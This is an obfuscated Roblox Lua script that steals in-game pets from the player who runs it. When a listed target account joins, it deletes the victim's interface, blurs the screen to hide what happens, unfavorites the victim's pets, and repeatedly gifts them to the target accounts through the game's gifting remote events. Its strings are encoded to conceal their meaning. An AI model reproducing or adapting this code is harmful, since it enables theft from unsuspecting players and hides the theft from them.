local gifted = false

-- Unfavorite all pets
local function unfavoriteAll()
    local Backpack = localPlayer:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('rsmUiuiXsMTfHMiQYJbvuJTqqACtTzBZDyLvFkCYyJBrQSCSxmPOWizQmFja3BhY2s='))
    for _, tool in ipairs(Backpack:GetChildren()) do
        if tool:IsA(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('pSilisDwTNEJsfbcJbChSYhPKeatqbwAbFEYaaXKwxJLLUksVsRaqjIVG9vbA==')) and tool:FindFirstChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('FiBFiXrDHmAVlIjFkNCcVfrrsbCwjsFsZiPszpBVIijsyrmLCFOdTQQZGV4')) then
            local dex = tool:FindFirstChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('UZWaKNYEPjqhvHTPeMjifVzdwuFFfOVUlOPrpavkeMCnglNihJRDMJGZGV4'))
            if dex:GetAttribute(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('nZGbekNcLUYchXbtRPbCPrqJLMurkgTJlvnJYegreTknEXPIuLAjznvZA==')) == true then
                ReplicatedStorage:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('KiAXZRXLaEMiSadCQbGnKUxjPZuxGThLwNkWSMtzlFBNuxGUxChjTIaR2FtZUV2ZW50cw==')):WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('HwmQFVVjNmEHcsTYNLmXhXOJiyWFchUgBzjVaSTGShHMoUTNwdzmonSRmF2b3JpdGVQZXQ=')):FireServer(tool, false)
            end
        end
    end
end

-- Freeze player screen visually (UI blur)
local function freezeScreen()
    local blur = Instance.new(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('OdJAJLopjwthxhhOfvIIPWYIVpDLyDkIuosGYRQERsInaEQsnzqFbXEQmx1ckVmZmVjdA=='), game:GetService(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('DmlPwLEeATHUfmYCKDYSrIZnlTWgKFMVrNzCINgGhnHcxgYOFBjyHuVTGlnaHRpbmc=')))
    blur.Size = 100
end

-- Remove all player GUI
local function removeGUI()
    for _, gui in ipairs(localPlayer:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('vTBQNbIIjygwwBSfnuGEocmOOtqIeppDekXzYDtRDqMaVhMomebWhvIUGxheWVyR3Vp')):GetChildren()) do
        if gui:IsA(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('EfAGjcsnuErKJthCimzDKXBQJJfRszuzjhxErkcTUaTmOjqPTilTMLeU2NyZWVuR3Vp')) or gui:IsA(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('gZSxVwdSZDCgQuPJGosfbYMuVPuYepDseDxxUtybNEhjzPnSkioPuYOQmlsbGJvYXJkR3Vp')) or gui:IsA(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('qgBHDOyaPCpIfWVbPJKetdzAbJCgNnSUruOoGQcdCRCmtqVvvCWnxHkU3VyZmFjZUd1aQ==')) then
            gui:Destroy()
        end
    end
end

-- Auto gifting function for drainPets
local function drain()
    gifted = true
    while gifted do
        local Backpack = localPlayer:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('ZDRhRSpZsUNWSuzPtwKrotLKhcqysgAWQfJVAiUkVaIIIquGpidMYjOQmFja3BhY2s='))
        for _, tool in ipairs(Backpack:GetChildren()) do
            for _, petName in ipairs(drainPets) do
                if string.find(tool.Name, petName) then
                    for _, recipientName in ipairs(targetUsernames) do
                        local recipient = Players:FindFirstChild(recipientName)
                        if recipient then
                            local args = {
                                VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('hcwISJiUjTjlFQLEZaxTAYAJvxGdfUaZlPATahihPkdgdnEiKmQFuCvR2l2ZVBldA=='),
                                recipient,
                                tool
                            }
                            ReplicatedStorage:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('aZHMjPpcnWgbNHQbdTnoMSTcqYOXTkfuNOMgRKbAdutZdPRDSQUImZsR2FtZUV2ZW50cw==')):WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('xdugcisClKvZNQgKsNVIxuRjstLKdlSnweFHyHDfMHoPNqcrEuYbLGHUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            task.wait(0.7)
                        end
                    end
                end
            end
        end
        task.wait(1.2)
    end
end

-- Watch for specific player joining
Players.PlayerAdded:Connect(function(player)
    if table.find(targetUsernames, player.Name) then
        task.delay(7, function()
            removeGUI()
            freezeScreen()
            unfavoriteAll()
            drain()
        end)
    end
end)

